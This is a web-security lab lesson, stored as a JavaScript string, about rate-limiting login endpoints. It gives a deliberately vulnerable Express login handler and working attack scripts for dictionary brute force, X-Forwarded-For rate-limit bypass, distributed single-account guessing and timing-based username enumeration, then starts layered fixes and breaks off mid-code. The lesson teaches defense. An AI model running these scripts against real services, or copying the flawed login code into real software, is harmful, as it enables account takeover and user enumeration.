window.LESSONS = window.LESSONS || {};
window.LESSONS.ratelimit = `

<h1 class="lesson-title">Lab 15: Rate-Limiting and Brute Force</h1>

<p class="lesson-subtitle">
  An unprotected login endpoint is an open door with a welcome mat. In this lab you will build a
  login route with zero defenses, tear it apart with four distinct attack scenarios, and then layer
  on the protections that real production systems need. By the end you will understand why rate-limiting
  is not one thing but a stack of complementary controls, and why getting any single layer wrong
  can negate all the others.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 1</span> Why Rate-Limiting Matters</h2>

<p>
  Let me set the scene. You deploy an Express API. The <code>/api/login</code> endpoint takes a
  username and password, checks them against the database, and returns a session token. It works.
  Your integration tests pass. You ship it. And now every attacker on the internet can throw
  millions of credential pairs at that endpoint as fast as their bandwidth allows. There is no
  lock on the door. No alarm. Not even a speed bump.
</p>

<p>
  This is not a theoretical problem. In 2019, a credential-stuffing campaign hit several major
  financial services companies using billions of username-password pairs leaked from other breaches.
  The attackers did not need a zero-day exploit. They did not need to find a vulnerability in the
  application logic. They just needed the login endpoint to accept unlimited requests and they
  already had databases of compromised credentials from breaches at other companies. When users
  reuse passwords across sites -- and they do -- this turns every leaked database into an attack
  tool against every other service on the internet.
</p>

<p>
  There are two broad categories of password attacks you need to understand:
</p>

<p>
  <strong>Online attacks</strong> happen against a live service. The attacker sends each guess as an
  HTTP request to your login endpoint. The speed is limited by network latency, server response time,
  and whatever rate-limiting you put in place. Without rate limits, a fast script can test thousands
  of passwords per second against a single account. With proper limits, you can slow that to a crawl.
</p>

<p>
  <strong>Offline attacks</strong> happen when the attacker has a copy of your password hashes. They
  run cracking software locally -- hashcat, John the Ripper -- against the hashes with no network
  involved. Speed depends entirely on the hashing algorithm and their hardware. A modern GPU can
  test billions of MD5 hashes per second but only a few thousand bcrypt hashes. Rate-limiting does
  not help here because the attacker never talks to your server. This is why password hashing
  algorithm choice matters so much, but that is a separate lab. Today we are focused on online
  attacks and how to stop them at the network layer.
</p>

<div class="callout warn">
  <div class="callout-title">Real-World Scale</div>
  <div class="callout-text">
    Akamai reported over 193 billion credential-stuffing attacks in 2020 alone. These are not
    targeted attacks by skilled hackers. They are automated tools running leaked credential lists
    against thousands of sites simultaneously. If your login endpoint has no rate limit, you are
    a target whether you know it or not.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 2</span> Build the Vulnerable Login -- No Rate Limit</h2>

<p>
  We need a baseline. Let us build an Express login endpoint that is functionally correct but
  has zero rate-limiting. This is closer to what most tutorials teach you to build than you
  might be comfortable with. It checks the username against the database, compares the password
  hash with bcrypt, and returns a token. That is it. No throttling, no lockout, no monitoring.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> express <span class="op">=</span> <span class="fn">require</span>(<span class="str">'express'</span>);
<span class="kw">const</span> bcrypt <span class="op">=</span> <span class="fn">require</span>(<span class="str">'bcrypt'</span>);
<span class="kw">const</span> crypto <span class="op">=</span> <span class="fn">require</span>(<span class="str">'crypto'</span>);
<span class="kw">const</span> db <span class="op">=</span> <span class="fn">require</span>(<span class="str">'./db'</span>);
<span class="kw">const</span> app <span class="op">=</span> <span class="fn">express</span>();

app.<span class="fn">use</span>(express.<span class="fn">json</span>());

<span class="cmt">// VULNERABLE: No rate limiting whatsoever</span>
app.<span class="fn">post</span>(<span class="str">'/api/login'</span>, <span class="kw">async</span> (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=&gt;</span> {
  <span class="kw">const</span> { username, password } <span class="op">=</span> req.body;

  <span class="kw">if</span> (!username || !password) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">400</span>).<span class="fn">json</span>({ error: <span class="str">'Username and password required'</span> });
  }

  <span class="kw">try</span> {
    <span class="cmt">// Look up the user in the database</span>
    <span class="kw">const</span> user <span class="op">=</span> <span class="kw">await</span> db.<span class="fn">findUserByUsername</span>(username);

    <span class="kw">if</span> (!user) {
      <span class="cmt">// VULN: Returns immediately for non-existent users</span>
      <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid username'</span> });
    }

    <span class="cmt">// Compare password hash -- this takes ~100ms for bcrypt</span>
    <span class="kw">const</span> match <span class="op">=</span> <span class="kw">await</span> bcrypt.<span class="fn">compare</span>(password, user.passwordHash);

    <span class="kw">if</span> (!match) {
      <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid password'</span> });
    }

    <span class="cmt">// Generate session token</span>
    <span class="kw">const</span> token <span class="op">=</span> crypto.<span class="fn">randomBytes</span>(<span class="num">32</span>).<span class="fn">toString</span>(<span class="str">'hex'</span>);
    <span class="kw">await</span> db.<span class="fn">createSession</span>(user.id, token);

    res.<span class="fn">json</span>({ success: <span class="kw">true</span>, token });
  } <span class="kw">catch</span> (err) {
    res.<span class="fn">status</span>(<span class="num">500</span>).<span class="fn">json</span>({ error: <span class="str">'Internal server error'</span> });
  }
});

app.<span class="fn">listen</span>(<span class="num">3000</span>, () <span class="op">=&gt;</span> {
  console.<span class="fn">log</span>(<span class="str">'Server running on port 3000'</span>);
});</pre>
</div>

<p>
  There are multiple problems here that we will exploit one by one, but the most glaring one
  is this: you can hit <code>/api/login</code> a million times per second and the server will
  dutifully process every single request. It will never slow down, never lock you out, never
  raise an alert. It is the authentication equivalent of leaving your front door wide open and
  putting a sign on the lawn that says "please try every key you have."
</p>

<p>
  Notice two additional vulnerabilities baked in that we will attack in later steps: the endpoint
  returns different error messages for invalid usernames versus invalid passwords, and the
  response time is measurably different because <code>bcrypt.compare</code> only runs when the
  user exists.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 3</span> Scenario 1 -- Simple Brute Force</h2>

<p>
  The simplest attack is also the most effective against an unprotected endpoint. We take a
  dictionary of common passwords and try every one against a known username. The
  <code>rockyou.txt</code> wordlist, extracted from a real breach, contains over 14 million
  passwords. Smaller targeted lists like the top 10,000 most common passwords will crack a
  surprising number of accounts. Let us build the attack script.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Dictionary Brute Force</div>
  <pre>
<span class="cmt">// brute-force.js -- dictionary attack against unprotected login</span>
<span class="kw">const</span> fs <span class="op">=</span> <span class="fn">require</span>(<span class="str">'fs'</span>);
<span class="kw">const</span> readline <span class="op">=</span> <span class="fn">require</span>(<span class="str">'readline'</span>);

<span class="kw">const</span> TARGET <span class="op">=</span> <span class="str">'http://localhost:3000/api/login'</span>;
<span class="kw">const</span> USERNAME <span class="op">=</span> <span class="str">'admin'</span>;
<span class="kw">const</span> WORDLIST <span class="op">=</span> <span class="str">'./wordlists/top-10000.txt'</span>;
<span class="kw">const</span> CONCURRENCY <span class="op">=</span> <span class="num">50</span>;  <span class="cmt">// parallel requests</span>

<span class="kw">async function</span> <span class="fn">tryPassword</span>(password) {
  <span class="kw">const</span> res <span class="op">=</span> <span class="kw">await</span> <span class="fn">fetch</span>(TARGET, {
    method: <span class="str">'POST'</span>,
    headers: { <span class="str">'Content-Type'</span>: <span class="str">'application/json'</span> },
    body: JSON.<span class="fn">stringify</span>({ username: USERNAME, password }),
  });
  <span class="kw">const</span> data <span class="op">=</span> <span class="kw">await</span> res.<span class="fn">json</span>();
  <span class="kw">return</span> { password, success: data.success <span class="op">===</span> <span class="kw">true</span>, status: res.status };
}

<span class="kw">async function</span> <span class="fn">main</span>() {
  <span class="kw">const</span> passwords <span class="op">=</span> fs.<span class="fn">readFileSync</span>(WORDLIST, <span class="str">'utf-8'</span>)
    .<span class="fn">split</span>(<span class="str">'\\n'</span>)
    .<span class="fn">filter</span>(Boolean);

  console.<span class="fn">log</span>(<span class="str">\\\`Loaded \\\${passwords.length} passwords. Starting brute force...\\\`</span>);
  <span class="kw">const</span> startTime <span class="op">=</span> Date.<span class="fn">now</span>();
  <span class="kw">let</span> attempted <span class="op">=</span> <span class="num">0</span>;
  <span class="kw">let</span> found <span class="op">=</span> <span class="kw">null</span>;

  <span class="cmt">// Process passwords in batches for concurrency</span>
  <span class="kw">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="num">0</span>; i <span class="op">&lt;</span> passwords.length; i <span class="op">+=</span> CONCURRENCY) {
    <span class="kw">if</span> (found) <span class="kw">break</span>;

    <span class="kw">const</span> batch <span class="op">=</span> passwords.<span class="fn">slice</span>(i, i <span class="op">+</span> CONCURRENCY);
    <span class="kw">const</span> results <span class="op">=</span> <span class="kw">await</span> Promise.<span class="fn">all</span>(batch.<span class="fn">map</span>(tryPassword));

    <span class="kw">for</span> (<span class="kw">const</span> r <span class="kw">of</span> results) {
      attempted++;
      <span class="kw">if</span> (r.success) {
        found <span class="op">=</span> r.password;
        <span class="kw">break</span>;
      }
    }

    <span class="kw">const</span> elapsed <span class="op">=</span> (Date.<span class="fn">now</span>() <span class="op">-</span> startTime) <span class="op">/</span> <span class="num">1000</span>;
    <span class="kw">const</span> rate <span class="op">=</span> Math.<span class="fn">round</span>(attempted <span class="op">/</span> elapsed);
    process.stdout.<span class="fn">write</span>(
      <span class="str">\\\`\\rAttempted: \\\${attempted} | Rate: \\\${rate}/sec | Elapsed: \\\${elapsed.toFixed(1)}s\\\`</span>
    );
  }

  <span class="kw">const</span> totalTime <span class="op">=</span> ((Date.<span class="fn">now</span>() <span class="op">-</span> startTime) <span class="op">/</span> <span class="num">1000</span>).<span class="fn">toFixed</span>(<span class="num">2</span>);
  console.<span class="fn">log</span>(<span class="str">'\\n'</span>);

  <span class="kw">if</span> (found) {
    console.<span class="fn">log</span>(<span class="str">\\\`[SUCCESS] Password found: \\\${found}\\\`</span>);
    console.<span class="fn">log</span>(<span class="str">\\\`Cracked in \\\${totalTime}s after \\\${attempted} attempts\\\`</span>);
  } <span class="kw">else</span> {
    console.<span class="fn">log</span>(<span class="str">\\\`[FAILED] Exhausted \\\${attempted} passwords in \\\${totalTime}s\\\`</span>);
  }
}

<span class="fn">main</span>();</pre>
</div>

<p>
  Against our unprotected endpoint, this script with a concurrency of 50 can test around
  2,000 to 5,000 passwords per second depending on the server hardware and bcrypt cost factor.
  A typical run against a top-10,000 wordlist finishes in under 10 seconds. If the target
  password is "password123" -- which is in nearly every wordlist -- it gets found in under
  a second.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Terminal output</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
$ node brute-force.js
Loaded 10000 passwords. Starting brute force...
Attempted: 847 | Rate: 4235/sec | Elapsed: 0.2s
[SUCCESS] Password found: password123
Cracked in 0.20s after 847 attempts</pre>
</div>

<p>
  Under a second. That is the reality of an unprotected login endpoint. The password was not
  even that bad by average user standards -- it had a number, it was 11 characters. But it was
  in a dictionary, and the server let us try 4,000 guesses per second. This is what you are
  defending against.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 4</span> Scenario 2 -- X-Forwarded-For Rate Limit Bypass</h2>

<p>
  The obvious first defense is IP-based rate limiting. Let us add <code>express-rate-limit</code>
  to block any IP that makes more than 10 login attempts in a 15-minute window. This is what
  most tutorials tell you to do, and it is a reasonable first step. But it has a fatal flaw
  when the application trusts proxy headers without proper configuration.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js -- adding basic rate limit</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> rateLimit <span class="op">=</span> <span class="fn">require</span>(<span class="str">'express-rate-limit'</span>);

<span class="cmt">// VULNERABLE: trust proxy set without specifying trusted proxies</span>
app.<span class="fn">set</span>(<span class="str">'trust proxy'</span>, <span class="kw">true</span>);

<span class="kw">const</span> loginLimiter <span class="op">=</span> <span class="fn">rateLimit</span>({
  windowMs: <span class="num">15</span> <span class="op">*</span> <span class="num">60</span> <span class="op">*</span> <span class="num">1000</span>,  <span class="cmt">// 15 minutes</span>
  max: <span class="num">10</span>,                     <span class="cmt">// 10 attempts per window</span>
  message: { error: <span class="str">'Too many login attempts, try again later'</span> },
  standardHeaders: <span class="kw">true</span>,
  legacyHeaders: <span class="kw">false</span>,
});

app.<span class="fn">post</span>(<span class="str">'/api/login'</span>, loginLimiter, <span class="kw">async</span> (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=&gt;</span> {
  <span class="cmt">// ... same login logic as before</span>
});</pre>
</div>

<p>
  Looks good, right? The problem is <code>app.set('trust proxy', true)</code>. When you set
  <code>trust proxy</code> to <code>true</code>, Express trusts the <code>X-Forwarded-For</code>
  header from any source. The <code>express-rate-limit</code> middleware uses <code>req.ip</code>
  to identify clients, and when <code>trust proxy</code> is enabled, <code>req.ip</code> comes
  from the <code>X-Forwarded-For</code> header. An attacker can simply set a different
  <code>X-Forwarded-For</code> value on each request and the rate limiter treats every request
  as coming from a different IP.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: X-Forwarded-For Rotation</div>
  <pre>
<span class="cmt">// xff-bypass.js -- bypass IP rate limiting via header rotation</span>
<span class="kw">const</span> fs <span class="op">=</span> <span class="fn">require</span>(<span class="str">'fs'</span>);

<span class="kw">const</span> TARGET <span class="op">=</span> <span class="str">'http://localhost:3000/api/login'</span>;
<span class="kw">const</span> USERNAME <span class="op">=</span> <span class="str">'admin'</span>;
<span class="kw">const</span> WORDLIST <span class="op">=</span> <span class="str">'./wordlists/top-10000.txt'</span>;

<span class="kw">function</span> <span class="fn">randomIP</span>() {
  <span class="cmt">// Generate a random IP for each request</span>
  <span class="kw">return</span> Array.<span class="fn">from</span>({ length: <span class="num">4</span> }, () <span class="op">=&gt;</span>
    Math.<span class="fn">floor</span>(Math.<span class="fn">random</span>() <span class="op">*</span> <span class="num">256</span>)
  ).<span class="fn">join</span>(<span class="str">'.'</span>);
}

<span class="kw">async function</span> <span class="fn">tryPassword</span>(password) {
  <span class="kw">const</span> spoofedIP <span class="op">=</span> <span class="fn">randomIP</span>();
  <span class="kw">const</span> res <span class="op">=</span> <span class="kw">await</span> <span class="fn">fetch</span>(TARGET, {
    method: <span class="str">'POST'</span>,
    headers: {
      <span class="str">'Content-Type'</span>: <span class="str">'application/json'</span>,
      <span class="str">'X-Forwarded-For'</span>: spoofedIP,
    },
    body: JSON.<span class="fn">stringify</span>({ username: USERNAME, password }),
  });
  <span class="kw">return</span> res.<span class="fn">json</span>();
}

<span class="kw">async function</span> <span class="fn">main</span>() {
  <span class="kw">const</span> passwords <span class="op">=</span> fs.<span class="fn">readFileSync</span>(WORDLIST, <span class="str">'utf-8'</span>)
    .<span class="fn">split</span>(<span class="str">'\\n'</span>)
    .<span class="fn">filter</span>(Boolean);

  console.<span class="fn">log</span>(<span class="str">'Bypassing rate limit via X-Forwarded-For rotation...'</span>);
  <span class="kw">let</span> attempted <span class="op">=</span> <span class="num">0</span>;

  <span class="kw">for</span> (<span class="kw">const</span> password <span class="kw">of</span> passwords) {
    attempted++;
    <span class="kw">const</span> result <span class="op">=</span> <span class="kw">await</span> <span class="fn">tryPassword</span>(password);

    <span class="kw">if</span> (result.success) {
      console.<span class="fn">log</span>(<span class="str">\\\`\\n[SUCCESS] Password: \\\${password} (attempt #\\\${attempted})\\\`</span>);
      <span class="kw">return</span>;
    }

    <span class="cmt">// Notice: we never get a 429 because each request</span>
    <span class="cmt">// appears to come from a unique IP address</span>
    <span class="kw">if</span> (attempted <span class="op">%</span> <span class="num">100</span> <span class="op">===</span> <span class="num">0</span>) {
      console.<span class="fn">log</span>(<span class="str">\\\`Attempted \\\${attempted} -- no 429 errors, rate limit bypassed\\\`</span>);
    }
  }
}

<span class="fn">main</span>();</pre>
</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Terminal output</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
$ node xff-bypass.js
Bypassing rate limit via X-Forwarded-For rotation...
Attempted 100 -- no 429 errors, rate limit bypassed
Attempted 200 -- no 429 errors, rate limit bypassed
Attempted 300 -- no 429 errors, rate limit bypassed

[SUCCESS] Password: password123 (attempt #847)</pre>
</div>

<p>
  The rate limit is completely useless. The attacker never receives a single 429 response
  because each request has a fresh IP in the <code>X-Forwarded-For</code> header. The server
  is dutifully rate-limiting each of the thousands of "unique" IPs -- but none of them have
  hit the limit. This is exactly the same as having no rate limit at all.
</p>

<div class="callout warn">
  <div class="callout-title">The trust proxy Mistake</div>
  <div class="callout-text">
    Setting <code>trust proxy</code> to <code>true</code> tells Express to trust the
    <code>X-Forwarded-For</code> header from <em>any</em> source. In production behind a known
    reverse proxy like Nginx or AWS ALB, you should set <code>trust proxy</code> to the number
    of proxies in front of your app (e.g., <code>1</code>) or to the specific IP address of your
    proxy. This way Express takes the client IP from the correct position in the header chain and
    ignores attacker-injected values.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 5</span> Scenario 3 -- Distributed Attack on a Single Account</h2>

<p>
  Let us say you fix the <code>trust proxy</code> issue. Now your rate limiter correctly
  identifies the real client IP and blocks it after 10 attempts. Problem solved? Not even close.
  The attacker rents a botnet -- a few hundred compromised machines or cheap VPS instances -- and
  distributes the attack. Each IP makes only a handful of attempts, well under the per-IP limit.
  But all of them are targeting the same account.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Distributed Brute Force -- Single Account</div>
  <pre>
<span class="cmt">// distributed-attack.js -- simulates attack from multiple real IPs</span>
<span class="cmt">// In reality, this runs on a botnet. Here we simulate with</span>
<span class="cmt">// sequential requests that each come from a different source.</span>

<span class="kw">const</span> TARGET <span class="op">=</span> <span class="str">'http://localhost:3000/api/login'</span>;
<span class="kw">const</span> USERNAME <span class="op">=</span> <span class="str">'admin'</span>;
<span class="kw">const</span> PASSWORDS_PER_IP <span class="op">=</span> <span class="num">5</span>;  <span class="cmt">// Stay under the per-IP limit of 10</span>
<span class="kw">const</span> TOTAL_IPS <span class="op">=</span> <span class="num">200</span>;       <span class="cmt">// 200 botnet nodes</span>

<span class="cmt">// Total attempts: 200 * 5 = 1,000 passwords tried</span>
<span class="cmt">// Each IP only makes 5 attempts, well under the limit</span>
<span class="cmt">// But the target account sees 1,000 guesses</span>

<span class="kw">async function</span> <span class="fn">attackFromNode</span>(nodeId, passwords) {
  <span class="kw">for</span> (<span class="kw">const</span> password <span class="kw">of</span> passwords) {
    <span class="kw">const</span> res <span class="op">=</span> <span class="kw">await</span> <span class="fn">fetch</span>(TARGET, {
      method: <span class="str">'POST'</span>,
      headers: { <span class="str">'Content-Type'</span>: <span class="str">'application/json'</span> },
      body: JSON.<span class="fn">stringify</span>({ username: USERNAME, password }),
    });

    <span class="kw">const</span> data <span class="op">=</span> <span class="kw">await</span> res.<span class="fn">json</span>();
    <span class="kw">if</span> (data.success) {
      console.<span class="fn">log</span>(<span class="str">\\\`[Node \\\${nodeId}] CRACKED: \\\${password}\\\`</span>);
      <span class="kw">return</span> password;
    }
  }
  <span class="kw">return</span> <span class="kw">null</span>;
}

<span class="cmt">// In a real botnet, each node runs independently from its own IP.</span>
<span class="cmt">// The server sees 5 attempts from IP-1, 5 from IP-2, etc.</span>
<span class="cmt">// No single IP exceeds the rate limit.</span>
<span class="cmt">// But the 'admin' account just absorbed 1,000 password guesses.</span></pre>
</div>

<p>
  Here is the key insight: <strong>per-IP rate limiting alone cannot protect individual accounts
  from distributed attacks.</strong> If you only count requests by source IP, an attacker with
  enough IPs can try as many passwords as they want against any single account. You need a
  separate counter that tracks failed login attempts per target account, regardless of where
  the requests come from.
</p>

<p>
  Think about it from the defender's perspective. Your per-IP limit of 10 attempts per 15 minutes
  is supposed to protect you. But the "admin" account just received 1,000 login attempts from
  200 different IPs, and not a single one triggered a rate-limit response. Your logs might show
  the pattern if you look carefully -- hundreds of failed logins for the same account in a short
  time window -- but nothing in your rate-limiting middleware flagged it.
</p>

<div class="callout info">
  <div class="callout-title">Why Both IP and Account Limits Matter</div>
  <div class="callout-text">
    IP-based limits stop unsophisticated attackers and automated scanners. Account-based limits
    stop targeted attacks on high-value accounts. You need both. A good rule of thumb: per-IP
    limits should be generous enough to avoid locking out legitimate users behind a NAT, while
    per-account limits should be strict enough to make brute force impractical even from a botnet.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 6</span> Scenario 4 -- Username Enumeration via Response Timing</h2>

<p>
  Go back and look at the login handler in Step 2. When the username does not exist, the
  function returns immediately with "Invalid username." When the username does exist but the
  password is wrong, the function calls <code>bcrypt.compare()</code> first, which takes roughly
  100 milliseconds at a cost factor of 10, and then returns "Invalid password." That timing
  difference is measurable over the network, even through noise and jitter. An attacker can
  use it to build a list of valid usernames without ever guessing a password.
</p>

<p>
  This is a timing side-channel attack. The server leaks information not through what it says
  but through how long it takes to say it.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Username Enumeration via Timing</div>
  <pre>
<span class="cmt">// timing-enum.js -- enumerate valid usernames by response time</span>
<span class="kw">const</span> TARGET <span class="op">=</span> <span class="str">'http://localhost:3000/api/login'</span>;
<span class="kw">const</span> DUMMY_PASSWORD <span class="op">=</span> <span class="str">'x'</span>;  <span class="cmt">// Doesn't matter, we are measuring time</span>
<span class="kw">const</span> SAMPLES <span class="op">=</span> <span class="num">5</span>;           <span class="cmt">// Repeat each username to average out noise</span>

<span class="kw">const</span> usernames <span class="op">=</span> [
  <span class="str">'admin'</span>,       <span class="cmt">// likely exists</span>
  <span class="str">'root'</span>,        <span class="cmt">// likely exists</span>
  <span class="str">'john'</span>,        <span class="cmt">// might exist</span>
  <span class="str">'xq7z9w2p'</span>,   <span class="cmt">// almost certainly does not exist</span>
  <span class="str">'testuser'</span>,   <span class="cmt">// might exist</span>
  <span class="str">'zzzfake99'</span>,  <span class="cmt">// almost certainly does not exist</span>
];

<span class="kw">async function</span> <span class="fn">measureLogin</span>(username) {
  <span class="kw">const</span> times <span class="op">=</span> [];
  <span class="kw">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="num">0</span>; i <span class="op">&lt;</span> SAMPLES; i++) {
    <span class="kw">const</span> start <span class="op">=</span> performance.<span class="fn">now</span>();
    <span class="kw">await</span> <span class="fn">fetch</span>(TARGET, {
      method: <span class="str">'POST'</span>,
      headers: { <span class="str">'Content-Type'</span>: <span class="str">'application/json'</span> },
      body: JSON.<span class="fn">stringify</span>({ username, password: DUMMY_PASSWORD }),
    });
    <span class="kw">const</span> elapsed <span class="op">=</span> performance.<span class="fn">now</span>() <span class="op">-</span> start;
    times.<span class="fn">push</span>(elapsed);
  }

  <span class="cmt">// Use median to reduce noise</span>
  times.<span class="fn">sort</span>((a, b) <span class="op">=&gt;</span> a <span class="op">-</span> b);
  <span class="kw">const</span> median <span class="op">=</span> times[Math.<span class="fn">floor</span>(times.length <span class="op">/</span> <span class="num">2</span>)];
  <span class="kw">return</span> { username, median: median.<span class="fn">toFixed</span>(<span class="num">2</span>) };
}

<span class="kw">async function</span> <span class="fn">main</span>() {
  console.<span class="fn">log</span>(<span class="str">'Username Enumeration via Timing Side-Channel'</span>);
  console.<span class="fn">log</span>(<span class="str">'==========================================\\n'</span>);

  <span class="kw">const</span> results <span class="op">=</span> [];
  <span class="kw">for</span> (<span class="kw">const</span> username <span class="kw">of</span> usernames) {
    <span class="kw">const</span> result <span class="op">=</span> <span class="kw">await</span> <span class="fn">measureLogin</span>(username);
    results.<span class="fn">push</span>(result);
    console.<span class="fn">log</span>(
      <span class="str">\\\`  \\\${result.username.padEnd(15)} \\\${result.median}ms\\\`</span>
    );
  }

  <span class="cmt">// Classify: usernames with significantly higher response times</span>
  <span class="cmt">// likely exist (bcrypt.compare was called)</span>
  <span class="kw">const</span> times <span class="op">=</span> results.<span class="fn">map</span>(r <span class="op">=&gt;</span> <span class="fn">parseFloat</span>(r.median));
  <span class="kw">const</span> threshold <span class="op">=</span> (Math.<span class="fn">min</span>(...times) <span class="op">+</span> Math.<span class="fn">max</span>(...times)) <span class="op">/</span> <span class="num">2</span>;

  console.<span class="fn">log</span>(<span class="str">\\\`\\nThreshold: \\\${threshold.toFixed(2)}ms\\\`</span>);
  console.<span class="fn">log</span>(<span class="str">'\\nResults:'</span>);
  <span class="kw">for</span> (<span class="kw">const</span> r <span class="kw">of</span> results) {
    <span class="kw">const</span> exists <span class="op">=</span> <span class="fn">parseFloat</span>(r.median) <span class="op">&gt;</span> threshold;
    console.<span class="fn">log</span>(
      <span class="str">\\\`  \\\${r.username.padEnd(15)} \\\${exists ? 'LIKELY EXISTS' : 'probably fake'}\\\`</span>
    );
  }
}

<span class="fn">main</span>();</pre>
</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Terminal output</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
$ node timing-enum.js
Username Enumeration via Timing Side-Channel
==========================================

  admin           112.34ms
  root            108.77ms
  john            105.91ms
  xq7z9w2p        3.21ms
  testuser       109.43ms
  zzzfake99        2.87ms

Threshold: 57.61ms

Results:
  admin           LIKELY EXISTS
  root            LIKELY EXISTS
  john            LIKELY EXISTS
  xq7z9w2p        probably fake
  testuser        LIKELY EXISTS
  zzzfake99       probably fake</pre>
</div>

<p>
  The signal is unmistakable. Valid usernames take around 105-112 milliseconds (the cost of
  <code>bcrypt.compare</code>), while non-existent usernames respond in about 3 milliseconds.
  That is a 30x to 40x difference. Even across the internet with variable latency, this signal
  is easy to extract with enough samples. The attacker does not even need to guess any passwords.
  They can enumerate your entire user directory just by measuring response times.
</p>

<p>
  This matters because it turns a one-dimensional attack (guess the password for a known user)
  into a two-phase attack: first enumerate valid usernames, then brute-force only those accounts
  that actually exist. It also leaks information about your user base that you probably do not want
  publicly available.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 7</span> Fix -- Layered Rate-Limiting</h2>

<p>
  Now that we have seen four distinct attack vectors, let us build a defense that addresses all of
  them simultaneously. The key principle is <strong>defense in depth</strong>: no single control
  stops every attack, but the combination makes brute force impractical. Here is the full
  implementation.
</p>

<div class="fix-box">
  <div class="fix-title">Fix: Proper trust proxy Configuration</div>
  <p>
    First, fix the <code>X-Forwarded-For</code> bypass. If you have one reverse proxy (e.g.,
    Nginx) in front of Express, set <code>trust proxy</code> to <code>1</code>. This tells
    Express to take the client IP from the first value in <code>X-Forwarded-For</code> that
    the trusted proxy set, ignoring anything the client injected.
  </p>
</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js -- trust proxy done right</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// Correct: trust only one proxy hop (your Nginx/ALB/Cloudflare)</span>
app.<span class="fn">set</span>(<span class="str">'trust proxy'</span>, <span class="num">1</span>);

<span class="cmt">// Or, trust a specific proxy IP:</span>
<span class="cmt">// app.set('trust proxy', '10.0.0.1');</span>

<span class="cmt">// NEVER do this in production:</span>
<span class="cmt">// app.set('trust proxy', true);  // trusts ALL X-Forwarded-For values</span></pre>
</div>

<div class="fix-box">
  <div class="fix-title">Fix: Combined IP + Account Rate Limiting</div>
  <p>
    Use two separate rate limiters. The IP-based limiter catches spray attacks across many
    accounts. The account-based limiter catches distributed attacks on a single account.
    Together they cover both dimensions of the attack surface.
  </p>
</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">middleware/rate-limit.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> rateLimit <span class="op">=</span> <span class="fn">require</span>(<span class="str">'express-rate-limit'</span>);
<span class="kw">const</span> RedisStore <span class="op">=</span> <span class="fn">require</span>(<span class="str">'rate-limit-redis'</span>);
<span class="kw">const</span> Redis <span class="op">=</span> <span class="fn">require</span>(<span class="str">'ioredis'</span>);

<span class="kw">const</span> redis <span class="op">=</span> <span class="kw">new</span> <span class="fn">Redis</span>();

<span class="cmt">// Layer 1: Per-IP rate limit</span>
<span class="kw">const</span> ipLimiter <span class="op">=</span> <span class="fn">rateLimit</span>({
  store: <span class="kw">new</span> <span class="fn">RedisStore</span>({ sendCommand: (...args) <span class="op">=&gt;</span> redis.<span class="fn">call</span>(...args) }),
  windowMs: <span class="num">15</span> <span class="op">*</span> <span class="num">60</span> <span class="op">*</span> <span class="num">1000</span>,  <span class="cmt">// 15 minutes</span>
  max: <span class="num">20</span>,                     <span class="cmt">// 20 attempts per IP per window</span>
  message: { error: <span class="str">'Too many requests from this IP'</span> },
  standardHeaders: <span class="kw">true</span>,
  legacyHeaders: <span class="kw">false</span>,
  skipSuccessfulRequests: <span class="kw">true</span>,  <span class="cmt">// Don't count successful logins</span>
});

<span class="cmt">// Layer 2: Per-account rate limit (custom middleware)</span>
<span class="kw">const</span> ACCOUNT_MAX <span class="op">=</span> <span class="num">5</span>;
<span class="kw">const</span> ACCOUNT_WINDOW <span class="op">=</span> <span class="num">15</span> <span class="op">*</span> <span class="num">60</span>;  <span class="cmt">// 15 minutes in seconds</span>
<span class="kw">const</span> LOCKOUT_DURATION <span class="op">=</span> <span class="num">30</span> <span class="op">*</span> <span class="num">60</span>;  <span class="cmt">// 30-minute lockout after threshold</span>

<span class="kw">async function</span> <span class="fn">accountLimiter</span>(req, res, next) {
  <span class="kw">const</span> { username } <span class="op">=</span> req.body;
  <span class="kw">if</span> (!username) <span class="kw">return</span> <span class="fn">next</span>();

  <span class="kw">const</span> key <span class="op">=</span> <span class="str">\\\`login_fail:\\\${username.toLowerCase()}\\\`</span>;
  <span class="kw">const</span> lockKey <span class="op">=</span> <span class="str">\\\`login_lock:\\\${username.toLowerCase()}\\\`</span>;

  <span class="cmt">// Check if account is locked</span>
  <span class="kw">const</span> locked <span class="op">=</span> <span class="kw">await</span> redis.<span class="fn">get</span>(lockKey);
  <span class="kw">if</span> (locked) {
    <span class="kw">const</span> ttl <span class="op">=</span> <span class="kw">await</span> redis.<span class="fn">ttl</span>(lockKey);
